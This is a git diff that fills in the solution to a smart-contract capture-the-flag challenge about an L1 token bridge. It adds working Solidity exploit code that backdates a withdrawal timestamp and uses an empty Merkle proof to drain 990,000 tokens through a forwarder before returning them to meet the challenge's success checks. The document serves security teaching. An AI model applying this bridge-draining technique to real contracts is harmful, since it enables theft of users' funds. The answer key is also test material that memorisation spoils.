@@ -85,12 +85,87 @@ contract WithdrawalChallenge is Test {
         assertEq(l1TokenBridge.totalDeposits(), INITIAL_BRIDGE_TOKEN_AMOUNT);
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
+    /*
+        The exploit takes advantage of the fact that the L1Gateway contract allows an operator to finalize withdrawals
+        by providing a valid Merkle proof for each withdrawal. The operator can call the `finalizeWithdrawal` function
+        with a past timestamp to bypass the 7-day delay requirement. By crafting a specific message that instructs
+        the L1Forwarder to call the `executeTokenWithdrawal` function on the L1TokenBridge, the attacker can withdraw
+        tokens to their own address without waiting for the delay period to protect against unauthorized withdrawals.
+        Then, whe execute the rest of the withdrawals to meet the success conditions and transfer all tokens from the player
+        to the deployer.
+    */
     function test_withdrawal() public checkSolvedByPlayer {
+
+   
+        bytes[] memory withdrawalsData =  new bytes[](WITHDRAWALS_AMOUNT);
+        uint[] memory timestamps = new uint[](WITHDRAWALS_AMOUNT);
+        address sender = 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16;
+        address recipient = 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5;
+
+        //Load the withdrawal data from json
+        withdrawalsData[0] = hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbAd8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000";
+        withdrawalsData[1] = hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbAd8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000";
+        withdrawalsData[2] = hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2C4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000";
+        withdrawalsData[3] = hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2C4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000";
+
+        //Timestamps extracted from the json data
+        timestamps[0] = 1718786915;
+        timestamps[1] = 1718786965;
+        timestamps[2] = 1718787050;
+        timestamps[3] = 1718787127;
+
+        //Craft the message to be sent to the forwarder
+        bytes memory message = abi.encodeCall(
+
+            //We transfer the tokens to the player directly to avoid them being scammed
+            L1Forwarder.forwardMessage,
+            (   
+                0,
+                address(0),
+                address(l1TokenBridge),
+                abi.encodeCall(
+                    TokenBridge.executeTokenWithdrawal,
+                    (player, 990_000e18)
+                )
+            )
+        );
+
+        //Finalize a withdrawal with the crafted message, bypassing the delay by setting a past timestamp
+        l1Gateway.finalizeWithdrawal(
+            0,
+            l2Handler, 
+            address(l1Forwarder), 
+            START_TIMESTAMP - 7 days,
+            message,
+            new bytes32[](0)
+         
+        );
         
+        //Advance time to be able to finalize the rest of the withdrawals
+        skip(8 days);
+    
+        //Finalize the rest of the withdrawals 
+        for (uint i = 0; i < WITHDRAWALS_AMOUNT ; i++) {
+
+            l1Gateway.finalizeWithdrawal(
+                i, 
+                sender, 
+                recipient, 
+                timestamps[i],
+                withdrawalsData[i],
+                new bytes32[](0)
+             
+            );
+   
+            
+        }
+        
+        //Transfer all tokens from the player to the deployer to meet the success conditions
+        token.transfer(address(l1TokenBridge), token.balanceOf(player));
+       
     }
+
+    
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
